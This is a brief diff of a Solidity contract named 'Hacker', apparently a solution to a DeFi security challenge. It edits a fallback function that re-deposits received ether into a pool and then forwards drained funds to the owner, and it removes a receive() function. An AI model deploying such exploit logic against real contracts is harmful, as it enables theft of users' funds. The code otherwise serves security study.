@@ -23,17 +23,16 @@ contract Hacker {
         pool.withdraw();
     }
 
-    fallback() external payable {
-        // require(owner != address(0));
 
+    fallback() external payable{
         if(!receivedMoney) {
             receivedMoney = true;
             pool.deposit{value: msg.value}();
         } else {
         (bool success, ) = owner.call{value: msg.value}("");
         require(success, "Cound't send the funds");
-        }
+        }     
     }
 
-    receive() external payable {}
+    
 }
